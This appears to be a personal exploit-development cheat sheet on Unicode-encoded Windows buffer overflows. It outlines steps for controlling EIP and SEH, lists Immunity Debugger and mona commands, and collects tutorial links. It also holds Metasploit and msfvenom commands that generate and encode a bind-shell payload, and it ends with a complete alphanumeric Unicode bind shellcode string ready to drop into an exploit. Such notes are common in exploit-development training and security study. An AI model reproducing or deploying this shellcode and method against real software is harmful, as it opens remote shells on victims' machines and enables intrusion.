Uniencoding Buffer Overflows

1. Find padding

2. Control EIP (for vanilla BoFs)

  - Find an address that points to your jump/call/… instruction, and that looks like this :  0x00nn00mm.  So if you overwrite RET with 0xnn,0xmm  it would become 00nn00mm

  - Find an address that is also formatted 0x00nn00mm, and close to the call/jump/… instruction that you want to execute. Verify that the instructions between the address and the actual call/jump address will not harm your stack/registers, and use that address

3. Control SEH (for SEH BoFs)

  - Find uniencoded pop-pop-ret instruction

4. Uniencoded Shellcode

  - Find an ASCII equivalent & jump to it

  - Write your own unicode-compatible shellcode from scratch

  - Use a decoder

    1. makeunicode2.py

    2. vense.pl

    3. alpha2 

    4. Metasploit

        ```
        ./msfpayload windows/exec CMD=calc R |
          ./msfencode -e x86/alpha_mixed -t raw |
            ./msfencode -e x86/unicode_upper BufferRegister=EAX -t perl
        ```
        
    5. UniShellGenerator



ImmunityDBG

!mona config -set workingfolder c:\Users\Sales2\Desktop

 !pvefindaddr p2
 
 C:\Users\Sales2\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger

https://yaksas.in/ycscblog/mona-py-for-exploit-devs-6-must-know-commands/#.Ywpt9XZByUk

https://www.offensive-security.com/metasploit-unleashed/msfencode/

https://www.oreilly.com/library/view/metasploit/9781593272883/apbs03.html

https://shellcode.blog/Writing_Unicode_Payloads/

https://iphelix.medium.com/corelan-tutorial-7-exercise-solution-8ee8eaedf36f

https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/


https://iphelix.medium.com/corelan-tutorial-7-exercise-solution-8ee8eaedf36f

https://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows/

https://www.exploit-db.com/exploits/10797

https://www.exploit-db.com/exploits/10280

https://shellcode.blog/Writing_Unicode_Payloads/

https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections

https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/

https://www.exploit-db.com/exploits/10280

https://www.exploit-db.com/exploits/9974

https://www.oreilly.com/library/view/metasploit/9781593272883/apbs04.html

https://github.com/un4ckn0wl3z/Alpha2-encoder

gcc alpha2.c -o alpha2

http://sparksandflames.com/files/x86InstructionChart.html

msfvenom -p windows/shell_bind_tcp LHOST=127.0.0.1 LPORT=136 -f raw > shellcode.raw
gcc alpha2.c -o alpha2
./alpha2 eax --unicode --uppercase < shellcode.raw

bind_shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK8SRKPM0KP1P59ZENQY0QTTK20NPDK0RLLDKR2MDDKT2MXLOGGPJNFNQKO6LOLQQ3LKRNLMPWQHOLMM1GWIRJRR2PWTK1BN0TKPJOL4K0LLQT8YSPHKQXQR1TKR9MPKQJ3DK19MHJCOJ19DKNT4KKQ9FNQKOFL918OLMKQXGP89PSEJVM33MZXOKSMMTRU9TPXTKQHNDKQJ3BFTKLLPKTK28MLKQ8SDKKT4KM1J0U9OTMTMTQK1KS1B9PZR1KO9PQO1OQJ4KMBZKDMQM1XNSP2M0KP38D7SCNRQOR4C80LRWO6M7KO8UVXV0KQKPKPO97TPTPPS8O9SPBKKPKOXU1ZKXQIPPYRKMOPPPOPPPQXJJLO9OYPKOXUDW1XKRKPKPSXTIYVRJLPPV0WC88B9KNWQWKOXU27S8X7IYNXKOKOHU0WS8SDZLOKIQKOZ5B767BHRU2NPMS1KO8UQXS32MQTKP3YK3QGR7QG01L62JMBPY0VZBKMS6XGOTMTOLKQKQTMQ4O4LPGVKP141DPPPVQFPVOVPV0NR6QFQC0VQXD9XLOOSVKOJ5DIK0PNPV0FKONP1XKX3WMM30KOZ5GKL0VUURB61X76EEGMUMKOJ5OLKVSLKZ3PKKK045M57K0GLSCBBOQZM0R3KOZ5A")

